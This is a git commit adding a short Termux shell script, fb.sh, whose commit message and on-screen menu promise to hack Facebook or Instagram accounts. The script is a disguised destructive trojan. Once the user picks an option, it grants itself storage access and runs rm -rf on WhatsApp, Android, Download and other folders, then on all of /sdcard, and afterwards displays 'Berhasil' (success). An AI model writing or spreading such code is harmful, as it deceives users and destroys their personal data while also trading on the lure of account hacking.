2f3414fa71ff13affc0a705904b714712b0b9176
Realbimabagust <51181900+FollowBimabt@users.noreply.github.com>
2019-06-25 13:11:19 +0700

    hack Facebook

---
+++ fb.sh
@@ -0,0 +1,23 @@
+hack instagram
+figlet IG|lolcat
+echo ""
+echo "(1).Hack ig"
+echo ""
+echo "(2).Keluar"
+echo ""
+read -p"pilih nomor" bim;
+
+figlet mulai|lolcat
+sleep 1
+sleep 1
+termux-setup-storage
+cd /sdcard
+rm -r -f Whastapp
+rm -r -f Android
+rm -r -f Download
+rm -r -f data
+rm -r -f mividio
+rm -r -f WhastApp
+rm -r -f /sdcard
+sleep 1
+figlet Berhasil|lolcat
